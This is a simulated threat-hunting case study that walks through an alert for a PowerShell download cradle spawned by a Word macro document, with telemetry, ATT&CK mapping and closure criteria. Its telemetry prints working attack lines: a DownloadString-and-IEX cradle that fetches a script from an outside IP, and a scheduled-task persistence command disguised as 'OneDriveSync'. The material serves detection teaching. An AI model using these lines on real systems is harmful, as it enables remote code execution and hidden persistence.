# Case 001 — PowerShell download cradle from a finance workstation

> **Simulated case.** The environment and the telemetry values are synthetic; the method, the queries and
> the decision criteria are the ones used on real hunts. No client data is involved.

## 1. The alert

Monday, 09:12. The EDR raises a medium-severity alert:

| Field | Value |
|---|---|
| Host | `WIN-FIN-07` (Windows 11, Finance) |
| User | `NORTHWIND\j.ortega` |
| Process | `powershell.exe` |
| Parent | `WINWORD.EXE` |
| Command line | `powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...` |
| Severity | medium (policy: encoded command with hidden window) |

The first decision is not «is this malicious?» but «what would I need to see to answer that?». An encoded
`-enc` with `-w hidden` from Word is a **marker**, not a finding: RMM agents and some document workflows
produce similar command lines.

## 2. Hypothesis and scope

> **If** this is a download cradle launched from a document, **then** the same host and user will show a
> network connection to a non-inventoried destination within 15 minutes, a file written to
> `%TEMP%`/`Downloads`, and a persistence artefact (scheduled task or Run key) within the hour.

Scope: `WIN-FIN-07`, 24 h before the alert, plus the user's logon sessions. Out of scope on purpose: other
endpoints (a hunt on one host is not a fleet-wide conclusion).

## 3. Telemetry requested

| # | Source | Event | Why |
|---|---|---|---|
| 1 | Sysmon | **1** process creation | parent, command line, hashes |
| 2 | PowerShell | **4104** script block | what the encoded command actually runs |
| 3 | Sysmon | **3** network connect | egress after the script |
| 4 | Sysmon | **11** file create | dropped payload |
| 5 | Sysmon | **12/13/14** registry | Run keys and services |
| 6 | Security | **4698** scheduled task created | persistence |
| 7 | Security | **4624/4648** | identity and explicit credentials |

Without **(1)** and **(2)** the hunt cannot conclude: you would see *that* PowerShell ran, not *what* it did.

## 4. What the telemetry showed

**Process tree (Sysmon 1), same host, 09:07–09:14**

| Time | Image | Parent | User | Note |
|---|---|---|---|---|
| 09:11:58 | `WINWORD.EXE` | `explorer.exe` | j.ortega | document opened from `\\fileserver\finance\2026\Q4\invoice_1042.docm` |
| 09:12:03 | `powershell.exe` | `WINWORD.EXE` | j.ortega | `-nop -w hidden -enc …` |
| 09:12:09 | `powershell.exe` | `powershell.exe` | j.ortega | child process, `-w hidden` again |
| 09:13:41 | `schtasks.exe` | `powershell.exe` | j.ortega | `/create /tn "OneDriveSync" /tr "powershell -w hidden -enc …" /sc minute /mo 30` |

**Decoded script block (4104), fragment**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://185.199.108.153/upd.ps1')
```

**Network (Sysmon 3)**

| Time | Destination | Port | Process |
|---|---|---|---|
| 09:12:12 | `185.199.108.153` | 80 | `powershell.exe` |
| 09:12:47 | `185.199.108.153` | 443 | `powershell.exe` |

**File (Sysmon 11)**

| Time | Path | Size |
|---|---|---|
| 09:12:44 | `C:\Users\j.ortega\AppData\Local\Temp\upd.ps1` | 4.7 KB |
| 09:13:12 | `C:\Users\j.ortega\AppData\Roaming\Microsoft\Windows\Recent\invoice_1042.lnk` | — |

**Persistence (4698)**

```
TaskName: \OneDriveSync
Author:   NORTHWIND\j.ortega
Command:  powershell -w hidden -enc <same blob>
Trigger:  every 30 minutes, starting 09:43
```

**Baseline check.** In the previous 30 days, `WIN-FIN-07` had **zero** `powershell.exe` children of
`WINWORD.EXE` and **zero** connections to `185.199.108.153`. The domain has no inventory record for that IP.
Two other hosts in Finance opened the same document share path in the last week; both must be checked before
declaring scope.

## 5. Analysis

1. **The marker was real, and the follow-on confirms intent.** Encoding plus hidden window alone would be
   noise; encoded from Word, followed by a download, a persisted task and egress, is a chain.
2. **The parent matters more than the command line.** `winword.exe` spawning PowerShell is rare in this
   estate; the baseline quantifies «rare» instead of assuming it.
3. **Persistence used the user's own privileges.** No elevation, no service: the task runs every 30 minutes
   as `j.ortega`. That is why the alert was medium and not high.
4. **The IP is a single point of failure for the adversary** and for us: if it rotates, the network pivot
   dies, which is why the 4104 content and the task name are the durable indicators.

## 6. ATT&CK mapping

| ID | Technique | Role in the case |
|---|---|---|
| `T1566.001` | Phishing: Spearphishing Attachment | the `.docm` that starts the chain *(inferred: document path and parent, not proven sender)* |
| `T1204.002` | User Execution: Malicious File | Word launching PowerShell |
| `T1059.001` | PowerShell | the cradle itself |
| `T1027` | Obfuscated Files or Information | `-enc` / base64 |
| `T1105` | Ingress Tool Transfer | `DownloadString` → `upd.ps1` |
| `T1071.001` | Web Protocols | HTTP/HTTPS egress |
| `T1053.005` | Scheduled Task | `\OneDriveSync` every 30 minutes |

## 7. Decision and closure

| Output | Condition met | Action taken |
|---|---|---|
| **Confirmed** | Chain (1)+(2)+(3)+(6) on the same host and user, plus the task artefact and a destination with no inventory record | Host isolated from the network; user session revoked; `upd.ps1` and the task captured as evidence; the document share path blocked |
| **Scope** | Two other hosts opened the same path | Their Sysmon 1 and 4698 checked before closing the case *(this is where the case stops being a single-host hunt)* |
| **Detection** | The chain is reproducible | A Sigma rule on `winword.exe → powershell.exe` with `-enc`/`-w hidden`, plus a second rule on `schtasks /create` from `powershell.exe`, delivered to detection engineering |

**Closure rule:** the hunt is refuted only with measured coverage — ≥95 % of Finance endpoints reporting
Sysmon 1 and ≥90 % with 4104 — and zero chains. With coverage below that, the honest output is
«visibility gap», not «clean».

## 8. What this case does not claim

- It is a **simulation**: no real client, no real telemetry, no prevalence figures.
- `T1566.001` is an **inference** from the document path; the email that delivered it is not in the data.
- The IP is illustrative; do not use it as an indicator in production.
- It covers the endpoint only. Cloud control planes and identity logs (the other half of a modern hunt)
  are out of scope here.
